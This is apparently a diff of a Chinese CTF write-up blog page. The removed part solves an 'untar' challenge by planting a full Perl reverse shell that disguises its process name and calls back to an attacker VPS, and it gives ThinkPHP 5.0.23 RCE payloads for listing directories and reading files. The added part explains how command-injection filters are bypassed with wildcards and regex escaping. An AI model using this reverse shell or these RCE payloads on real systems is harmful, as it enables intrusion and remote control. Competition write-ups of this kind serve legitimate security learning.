@@ -134,106 +134,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-湖湘杯复赛" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>总共 2 道题目</p>
-<h2 id="untar"><a href="#untar" class="headerlink" title="untar"></a>untar</h2><p>参考文章：<a href="[&lt;https://1isten.xyz/2018/10/03/记一次对ssrf的理解/">记一次对ssrf的理解</a></p>
-<p>源码如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; !preg_match(<span class="string">'/^(http|https):\/\/.*/'</span>, $_GET[<span class="string">"url"</span>]))</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    $url  = str_replace(<span class="string">"|"</span>, <span class="string">""</span>, $_GET[<span class="string">"url"</span>]);</span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($url));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    shell_exec(<span class="string">"UNTAR "</span>.escapeshellarg(basename($info[<span class="string">"basename"</span>])));</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这是一道<code>SSRF</code>题目</p>
-<p>传入的参数一共只有 2 个：<code>url</code>和<code>filename</code>：① 参数 url 只能使用<code>http://</code>或者<code>https://</code>协议；② 参数 filename 经过<code>pathinfo()</code>函数处理；二者都用<code>escapeshellarg()</code>函数处理</p>
-<p><strong>escapeshellarg()</strong></p>
-<p>作用：给参数加上单引号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(escapeshellarg(&quot;file&quot;));</span><br><span class="line">string(6) &quot;&apos;file&apos;&quot;</span><br></pre></td></tr></table></figure>
-<p><strong>pathinfo()</strong></p>
-<p>作用：以数组的形式返回文件路径的信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(pathinfo(&quot;file&quot;));</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">&#125;</span><br><span class="line">php &gt; var_dump(pathinfo(&quot;path/file.php&quot;));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(4) &quot;path&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(8) &quot;file.php&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">  string(3) &quot;php&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>解题思路</strong></p>
-<p>弄清楚之后，我们直接看着 payload 梳理解题思路，payload 如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一次执行：</span><br><span class="line">?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt</span><br><span class="line"></span><br><span class="line">第二次执行：</span><br><span class="line">?filename=xxx&amp;url=http://Your_VPS_IP</span><br><span class="line">Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口</span><br></pre></td></tr></table></figure>
-<p>① 首先分析第一个 payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt</span><br></pre></td></tr></table></figure>
-<p>看一下 pathinfo() 对我们第一个 payload 中 filename 参数的解析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(pathinfo(&quot;URI/listen.pm&quot;));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(3) &quot;URI&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(9) &quot;listen.pm&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">  string(2) &quot;pm&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(6) &quot;listen&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>backdoor.txt 像参考文章说的一样，是一个<code>perl后门</code>，内容如下：</p>
-<p>:alarm_clock:后门内的 ip 要记得改成你的 VPS 的 ip</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = "";</span></span><br><span class="line"><span class="string">my $fake_process_name = "/usr/sbin/apache";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = "[httpd]";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;'REMOTE_ADDR'&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">"&lt;p&gt;\n"</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r Connection: close\r Content-Type: text\/html\r\n\r\n"</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>所以当我们执行第一个 payload 后，会在当前目录下再创建一个<code>URI</code>目录，并且进入这个目录，再创建 listen.pm ，内容为我们的 perl后门（backdoor.txt）</p>
-<p>② 接下来分析第二个 payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=xxx&amp;url=http://Your_VPS_IP</span><br><span class="line">Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口</span><br></pre></td></tr></table></figure>
-<p>由于做了重定向，所以当访问我们的 VPS 时，就等同于访问<code>listen://listen.xyz</code>，但是 listen 是未定义的模块，所以会自动搜索并加载<code>URI/listen.pm</code>（pm 是 perl 脚本的后缀），也就是我们刚在上传的后门（这里因为源码中对参数 url 做了过滤，只允许 http:// 和 https:// 协议，所以不能像参考文章那样直接在 url 参数中写 listen:// ，需要做个重定向来解决）</p>
-<p>重定向做完 + 端口监听 + 执行 payload 之后，就会收到 shell</p>
-<p>然后执行根目录下的<code>readflag</code>就能拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/4-1.png" alt="4-1"></p>
-<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp?"></a>thinkphp?</h2><p>按照题目的提示，应该是<code>thinkphp</code>的洞。进来后要登录，先注册一个普通用户登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-1.png" alt="1-1"></p>
-<p>然后用这个普通用户登陆进去</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-2.png" alt="1-2"></p>
-<p>打算直接用一下之前刚碰到的<code>thinkphp 5.0.23</code>的<code>RCE</code>，看一下漏洞是否存在，结果直接看到版本号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.62:19403/?s=captcha</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-3.png" alt="1-3"></p>
-<p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-0" target="_blank" rel="noopener">记一次有趣的tp5代码执行</a></p>
-<p>试一下<code>scandir()</code>和<code>var_dump()</code>，扫描当前目录，直接出结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=.</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-4.png" alt="1-4"></p>
-<p>然后在<code>根目录</code>下找到<code>flag</code>字样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-5.png" alt="1-5"></p>
-<p>直接读取内容，拿下 flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=readfile&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../flag</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-6.png" alt="1-6"></p>
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>一共 2 道题目</p>
-<h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something in image"></a>something in image</h2><p>解压下来一个名为<code>badimages</code>的文件，直接拿到 fl</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings badimages | grep -i flag</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/2-1.png" alt="2-1"></p>
-<h2 id="EzMemory"><a href="#EzMemory" class="headerlink" title="EzMemory"></a>EzMemory</h2><p>文件有点大，但是跟上一题一样，还是直接拿下 flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mem.raw | grep -i flag&#123;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/3-1.png" alt="3-1"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/11/09/湖湘杯复赛/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-Sql 注入 Bypass" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -370,27 +270,106 @@
 
 
   
-    <article id="post-上海CTF Write Up" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-2019年11月份 CTF Write Up 集合" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/30/上海CTF Write Up/">上海 CTF Write Up（附Boring_code）</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/11/01/2019年11月份 CTF Write Up 集合/">2019年11月份 CTF Write Up 集合</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/10/30/上海CTF Write Up/" class="archive-article-date">
-  	<time datetime="2019-10-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-30</time>
+        <a href="/Knlvre.github-io/2019/11/01/2019年11月份 CTF Write Up 集合/" class="archive-article-date">
+  	<time datetime="2019-10-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Bytectf-boring-code"><a href="#Bytectf-boring-code" class="headerlink" title="Bytectf boring_code"></a>Bytectf boring_code</h2><p>因为 <code>decade</code> 这道题涉及到 boring_code 的知识点，所以决定在本文章中复现一下这道题目</p>
+        <blockquote>
+<p>UNCTF、上海 CTF、湖湘杯复赛</p>
+</blockquote>
+<h1 id="UNCTF"><a href="#UNCTF" class="headerlink" title="UNCTF"></a>UNCTF</h1><p>时间：2019年10月22日 — 2019年10月27日</p>
+<p>因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写</p>
+<p>记录</p>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><blockquote>
+<p>考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符</p>
+</blockquote>
+<p>开始做题前先清楚几个知识点：</p>
+<p><strong>① PHP正则匹配反斜杠的特点</strong></p>
+<p>在本题的<code>preg_match()</code>函数中，我们可以发现对<code>反斜杠（\）</code>的过滤使用的是<code>\\</code>，但是这样写是不对的，正确写法是<code>三个反斜杠（\\\）</code>。在 PHP 正则中，三个反斜杠才能匹配到真正意义上的一个<code>字符反斜杠</code></p>
+<p>因为在 PHP 代码中，PHP解释器本身会对反斜杠进行一次解释，而 正则函数 本身也会对反斜杠进行解释。并且，如果反斜杠后面的字符不需要转义，即反斜杠没有起转义作用时，它就会被当成普通字符串保留下来</p>
+<p>两个反斜杠</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat index.php </span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[a];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\\/"</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"NO"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Yes"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># curl 'http://127.0.0.1?a=\';</span></span><br><span class="line">Yes</span><br></pre></td></tr></table></figure>
+<p>PHP解释器完成第一次反斜杠解释，变为：<code>preg_match(&quot;/\/&quot;,$a)</code>，正则完成第二次反斜杠解释，变为：<code>preg_match(&quot;//&quot;,$a)</code></p>
+<p>Ps：等于说第二次解释反斜杠（正则完成的）的时候，反斜杠作用的目标是<code>斜杠（/）</code>，但是这没有意义，因为<code>“/”</code>本身就是没有其他作用的字符。preg_match中的第一个参数需要有一对任何非字母、数字、“\”或空格的字符作为分隔符，也就是我们最常用的“/” </p>
+<p>三个反斜杠</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat index.php </span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[a];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\\\/"</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"NO"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Yes"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># curl 'http://127.0.0.1?a=\';</span></span><br><span class="line">NO</span><br></pre></td></tr></table></figure>
+<p>PHP解释器完成第一次反斜杠解释，三个反斜杠中，第一个反斜杠解释第二个反斜杠，第三个反斜杠解释结尾的“/”，但是因为没有实际作用，所以它被保留下来，变为：<code>preg_match(&quot;/\\/&quot;,$a)</code>，即原本第二个和第三个反斜杠被保留了</p>
+<p>正则完成第二次反斜杠解释，变为：<code>preg_match(&quot;/\/&quot;,$a)</code>，就刚好匹配反斜杠字符</p>
+<p><strong>② 文件通配符</strong></p>
+<p>Linux 的命令行中，是允许使用通配符的（<code>?</code>和<code>*</code>）</p>
+<p>生成 3 个测试文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># ls</span></span><br><span class="line">abc.txt  ab.txt  a.txt</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat a.txt </span></span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat ab.txt </span></span><br><span class="line">ab</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat abc.txt </span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
+<p><code>“*”</code>的使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat a*.txt</span></span><br><span class="line">abc</span><br><span class="line">ab</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
+<p><code>“?”</code>的使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat ?.txt</span></span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat a?.txt</span></span><br><span class="line">ab</span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat ??.txt</span></span><br><span class="line">ab</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat a??.txt</span></span><br><span class="line">abc</span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat ???.txt</span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
+<p>以上是对文件的匹配，但是当想要匹配的是命令时，则需要加上命令的<code>二进制文件</code>的位置，不然只会提示<code>command not found</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># ca? a.txt</span></span><br><span class="line">bash: ca?: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># /bin/ca? abc.txt</span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
+<p>还有一个骚操作可以代替通配符，就是<code>中括号</code></p>
